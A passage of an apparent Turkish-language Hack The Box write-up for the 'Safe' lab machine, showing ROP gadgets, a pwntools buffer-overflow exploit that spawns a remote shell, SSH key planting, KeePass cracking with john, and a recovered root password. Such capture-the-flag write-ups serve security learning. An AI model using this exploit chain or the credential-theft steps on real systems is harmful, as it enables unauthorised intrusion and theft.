0x0000000000401209: pop rsi<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401205: pop rsp<span class="p">;</span> pop r13<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401129: push rbp<span class="p">;</span> mov rbp, rsp<span class="p">;</span> call 0x10b0<span class="p">;</span> mov byte ptr <span class="o">[</span>rip + 0x2f0f], 1<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040100d: sal byte ptr <span class="o">[</span>rdx + rax - 1], 0xd0<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401215: sub esp, 8<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401001: sub esp, 8<span class="p">;</span> mov rax, qword ptr <span class="o">[</span>rip + 0x2fed]<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
0x0000000000401214: sub rsp, 8<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401000: sub rsp, 8<span class="p">;</span> mov rax, qword ptr <span class="o">[</span>rip + 0x2fed]<span class="p">;</span> <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
0x000000000040100c: <span class="nb">test </span>eax, eax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
0x000000000040100c: <span class="nb">test </span>eax, eax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004010c3: <span class="nb">test </span>eax, eax<span class="p">;</span> je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x0000000000401105: <span class="nb">test </span>eax, eax<span class="p">;</span> je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x000000000040100b: <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> 
0x000000000040100b: <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1012<span class="p">;</span> call rax<span class="p">;</span> add rsp, 8<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004010c2: <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x10d0<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x0000000000401104: <span class="nb">test </span>rax, rax<span class="p">;</span> je 0x1110<span class="p">;</span> mov edi, 0x404048<span class="p">;</span> jmp rax<span class="p">;</span> 
0x000000000040119c: xchg eax, r8d<span class="p">;</span> mov rdi, rax<span class="p">;</span> call 0x1030<span class="p">;</span> mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040109a: hlt<span class="p">;</span> nop dword ptr <span class="o">[</span>rax + rax]<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004011ab: leave<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040119d: nop<span class="p">;</span> mov rdi, rax<span class="p">;</span> call 0x1030<span class="p">;</span> mov eax, 0<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
0x000000000040115c: nop<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span> 
0x00000000004010cf: nop<span class="p">;</span> ret<span class="p">;</span> 
0x0000000000401016: ret<span class="p">;</span> 

99 gadgets found
</code></pre></div></div>
<h5 id="0x0000000000401206-pop-r13-pop-r14-pop-r15-ret--bu-gadgetlerden-biri-3-tane-daha-var">0x0000000000401206: pop r13; pop r14; pop r15; ret;  bu gadgetlerden biri 3 tane daha var</h5>
<h5 id="bulunan-gadgetin-offsetini-alalım-0x401206">Bulunan gadgetin offsetini alalım 0x401206</h5>
<h5 id="yapmaya-çalıştığımız-şey-bufferı-taşırıp-rspnin--binsh-adresini-göstermesi-r13-gadgetine-system-adresini-gösterip-r14-ve-r15-e-null-byte-x00-bastırmaktır-test-fonksiyonu-programın-normal-akışı-sırasında-hiç-kullanılmamıştır-test-fonksiyonunu-çağırıp-rsp-değerini-binsh--rdiye-yazılacaktır-r13-adresine-zıplayıp-shell-içerisinde-komut-çalıştırılmalıdır">Yapmaya çalıştığımız şey, bufferı taşırıp, RSP’nin  /bin/sh adresini göstermesi. r13 gadgetine system adresini gösterip, r14 ve r15 e null byte “\x00” bastırmaktır. Test fonksiyonu programın normal akışı sırasında hiç kullanılmamıştır test fonksiyonunu çağırıp, RSP değerini (“/bin/sh”)  rdi’ye yazılacaktır. r13 adresine zıplayıp shell içerisinde komut çalıştırılmalıdır.</h5>
<h5 id="bu-kadar-boş-yeter-kaynak-koda-geçeyim">Bu kadar boş yeter. Kaynak koda geçeyim.</h5>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># gerekli library, aslinda cok ta gerekli degil ama yine de dursun profit
</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.10.147"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span> <span class="c1"># baglanilacak sunucu ve portu
</span><span class="n">trash</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">112</span> <span class="c1"># normalde 119 gormustuk. ancak /bin/sh 7 byte oldugu icin
# 112 + 7 byte seklinde stacki tastiriyoruz
</span><span class="n">system</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401040</span><span class="p">)</span> <span class="c1"># system adresi
</span><span class="n">rpop13</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401206</span><span class="p">)</span> <span class="c1"># r13 adresi 
</span><span class="n">rjmp13</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401152</span><span class="p">)</span> <span class="c1"># hic bir zaman kullanilmayan test fonksiyonu
</span><span class="n">shell</span> <span class="o">=</span>  <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span> <span class="c1"># komut calistiracagimiz shell
</span><span class="n">NULL</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="c1"># NULL byte
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">trash</span> <span class="o">+</span> <span class="n">shell</span> <span class="o">+</span> <span class="n">rpop13</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span>  <span class="n">NULL</span> <span class="o">+</span> <span class="n">NULL</span> <span class="o">+</span> <span class="n">rjmp13</span> <span class="c1"># tasir + shell 
# null byte +  rop attack 
# null*2 + cagrilmayan test adresi
</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># payloadi gonder
</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1"># i/o
</span></code></pre></div></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">~/</span><span class="n">HTB</span><span class="o">/</span><span class="n">Safe</span> <span class="c1"># python exploit.py                                                                                                                                               
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="mf">10.10.10.147</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">1337</span><span class="p">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
 <span class="mi">14</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">22</span> <span class="n">up</span> <span class="mi">10</span><span class="p">:</span><span class="mi">24</span><span class="p">,</span>  <span class="mi">0</span> <span class="n">users</span><span class="p">,</span>  <span class="n">load</span> <span class="n">average</span><span class="p">:</span> <span class="mf">0.00</span><span class="p">,</span> <span class="mf">0.00</span><span class="p">,</span> <span class="mf">0.00</span>
<span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">lsah</span> 
<span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">lsah</span>
<span class="n">total</span> <span class="mi">84</span><span class="n">K</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">22</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">32</span> <span class="o">.</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">22</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">33</span> <span class="nb">bin</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">34</span> <span class="n">boot</span>
   <span class="mi">0</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">17</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">3.1</span><span class="n">K</span> <span class="n">Oct</span> <span class="mi">16</span> <span class="mi">03</span><span class="p">:</span><span class="mi">48</span> <span class="n">dev</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">76</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">Aug</span> <span class="mi">23</span> <span class="mi">06</span><span class="p">:</span><span class="mi">17</span> <span class="n">etc</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">34</span> <span class="n">home</span>
   <span class="mi">0</span> <span class="n">lrwxrwxrwx</span>   <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">29</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">32</span> <span class="n">initrd</span><span class="o">.</span><span class="n">img</span> <span class="o">-&gt;</span> <span class="n">boot</span><span class="o">/</span><span class="n">initrd</span><span class="o">.</span><span class="n">img</span><span class="o">-</span><span class="mf">4.9.0</span><span class="o">-</span><span class="mi">9</span><span class="o">-</span><span class="n">amd64</span>
   <span class="mi">0</span> <span class="n">lrwxrwxrwx</span>   <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">29</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">32</span> <span class="n">initrd</span><span class="o">.</span><span class="n">img</span><span class="o">.</span><span class="n">old</span> <span class="o">-&gt;</span> <span class="n">boot</span><span class="o">/</span><span class="n">initrd</span><span class="o">.</span><span class="n">img</span><span class="o">-</span><span class="mf">4.9.0</span><span class="o">-</span><span class="mi">9</span><span class="o">-</span><span class="n">amd64</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">14</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">33</span> <span class="n">lib</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">32</span> <span class="n">lib64</span>
 <span class="mi">16</span><span class="n">K</span> <span class="n">drwx</span><span class="o">------</span>   <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">16</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">31</span> <span class="n">lost</span><span class="o">+</span><span class="n">found</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">31</span> <span class="n">media</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">32</span> <span class="n">mnt</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">32</span> <span class="n">opt</span>
   <span class="mi">0</span> <span class="n">dr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">134</span> <span class="n">root</span> <span class="n">root</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">16</span> <span class="mi">03</span><span class="p">:</span><span class="mi">48</span> <span class="n">proc</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwx</span><span class="o">------</span>   <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">Aug</span> <span class="mi">23</span> <span class="mi">06</span><span class="p">:</span><span class="mi">17</span> <span class="n">root</span>
   <span class="mi">0</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">17</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">540</span> <span class="n">Oct</span> <span class="mi">16</span> <span class="mi">03</span><span class="p">:</span><span class="mi">48</span> <span class="n">run</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">Aug</span> <span class="mi">23</span> <span class="mi">06</span><span class="p">:</span><span class="mi">17</span> <span class="n">sbin</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">32</span> <span class="n">srv</span>
   <span class="mi">0</span> <span class="n">dr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">13</span> <span class="n">root</span> <span class="n">root</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">16</span> <span class="mi">12</span><span class="p">:</span><span class="mi">18</span> <span class="n">sys</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxrwxrwt</span>  <span class="mi">11</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">Oct</span> <span class="mi">16</span> <span class="mi">13</span><span class="p">:</span><span class="mi">17</span> <span class="n">tmp</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">10</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">32</span> <span class="n">usr</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">12</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">33</span> <span class="n">var</span>
   <span class="mi">0</span> <span class="n">lrwxrwxrwx</span>   <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">26</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">32</span> <span class="n">vmlinuz</span> <span class="o">-&gt;</span> <span class="n">boot</span><span class="o">/</span><span class="n">vmlinuz</span><span class="o">-</span><span class="mf">4.9.0</span><span class="o">-</span><span class="mi">9</span><span class="o">-</span><span class="n">amd64</span>
   <span class="mi">0</span> <span class="n">lrwxrwxrwx</span>   <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">26</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">08</span><span class="p">:</span><span class="mi">32</span> <span class="n">vmlinuz</span><span class="o">.</span><span class="n">old</span> <span class="o">-&gt;</span> <span class="n">boot</span><span class="o">/</span><span class="n">vmlinuz</span><span class="o">-</span><span class="mf">4.9.0</span><span class="o">-</span><span class="mi">9</span><span class="o">-</span><span class="n">amd64</span>
<span class="err">$</span> <span class="n">wc</span> <span class="o">-</span><span class="n">c</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="mi">33</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/.</span><span class="n">ssh</span>
<span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">lsah</span>
<span class="n">total</span> <span class="mf">8.0</span><span class="n">K</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">18</span> <span class="o">.</span>
<span class="mf">4.0</span><span class="n">K</span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">user</span> <span class="n">user</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span> <span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">18</span> <span class="o">..</span>
<span class="err">$</span>  
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~ <span class="c"># ssh-keygen                                                                                                                                                                    </span>
Generating public/private rsa key pair.
Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/root/.ssh/id_rsa<span class="o">)</span>: 
/root/.ssh/id_rsa already exists.
Overwrite <span class="o">(</span>y/n<span class="o">)</span>? y
Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 
Enter same passphrase again: 
Your identification has been saved <span class="k">in</span> /root/.ssh/id_rsa.
Your public key has been saved <span class="k">in</span> /root/.ssh/id_rsa.pub.
The key fingerprint is:
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~ <span class="c"># wc -c .ssh/id_rsa.pub                                                                                                                                                       </span>
569 .ssh/id_rsa.pub
</code></pre></div></div>
<h5 id="id_rsapub-dosyasının-içeriğini-kopyalayıp-user-içerisindeki-ssh-dizinine-authorized_keys-ismi-ile-yapıştıralım">id_rsa.pub dosyasının içeriğini kopyalayıp, user içerisindeki .ssh dizinine authorized_keys ismi ile yapıştıralım.</h5>
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/HTB/Safe <span class="c"># ssh user@10.10.10.147                                                                                                                                                </span>
The authenticity of host <span class="s1">'10.10.10.147 (10.10.10.147)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:SLbYsnF/xaUQIxRufe8Ux6dZJ9+Jler9PTISUR90xkc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.147<span class="s1">' (ECDSA) to the list of known hosts.
Linux safe 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1 (2019-04-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
user@safe:~$ 
</span></code></pre></div></div>
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@safe:~<span class="nv">$ </span><span class="nb">ls
</span>IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG  myapp  MyPasswords.kdbx  user.txt
</code></pre></div></div>
<h5 id="scp-ile-user-makinesindeki-görselleri-ve-kdbx-dosyasını-alalım">scp ile user makinesindeki görselleri ve kdbx dosyasını alalım.</h5>
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/HTB/Safe <span class="c"># scp user@10.10.10.147:/home/user/IMG_0547.JPG /root/HTB/Safe/img.JPG   </span>
~/HTB/Safe <span class="c"># scp user@10.10.10.147:/home/user/MyPasswords.kdbx /root/HTB/Safe/   </span>
~/HTB/Safe <span class="c"># keepass2john MyPasswords.kdbx -k img.JPG &gt; hash.txt</span>
~/HTB/Safe <span class="c"># john --wordlist=/root/HTB/Safe/rockyou.txt hash.txt                                                                                                                       root@0x67616e67</span>
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>KeePass <span class="o">[</span>SHA256 AES 32/64]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 60000 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>version<span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
Cost 3 <span class="o">(</span>algorithm <span class="o">[</span><span class="nv">0</span><span class="o">=</span>AES, <span class="nv">1</span><span class="o">=</span>TwoFish, <span class="nv">2</span><span class="o">=</span>ChaCha]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
Will run 8 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
bullshit         <span class="o">(</span>MyPasswords<span class="o">)</span>
1g 0:00:00:03 DONE <span class="o">(</span>2019-10-16 21:51<span class="o">)</span> 0.2873g/s 294.2p/s 294.2c/s 294.2C/s andre..bethany
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/HTB <span class="c"># kpcli --kdb MyPasswords.kdbx --key img.JPG                                                                                                                                root@0x67616e67</span>
Please provide the master password: <span class="k">*************************</span>

KeePass CLI <span class="o">(</span>kpcli<span class="o">)</span> v3.1 is ready <span class="k">for </span>operation.
Type <span class="s1">'help'</span> <span class="k">for </span>a description of available commands.
Type <span class="s1">'help &lt;command&gt;'</span> <span class="k">for </span>details on individual commands.

kpcli:/&gt; <span class="nb">cd </span>MyPasswords/
kpcli:/MyPasswords&gt; show <span class="nt">-f</span> Root<span class="se">\ </span>password 

 Path: /MyPasswords/
Title: Root password
Uname: root
 Pass: u3v2249dl9ptv465cogl3cnpo3fyhk
  URL: 
Notes: 

kpcli:/MyPasswords&gt; 
</code></pre></div></div>
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@safe:~<span class="nv">$ </span>su - 
Password: 
root@safe:~# <span class="nb">wc</span> <span class="nt">-c</span> /root/root.txt
33 /root/root.txt
root@safe:~# 
</code></pre></div></div>
<hr />
<h1 id="author-sectiontext">Author <a href=" https://twitter.com/SectionText">SectionText</a></h1>
<hr />
:ET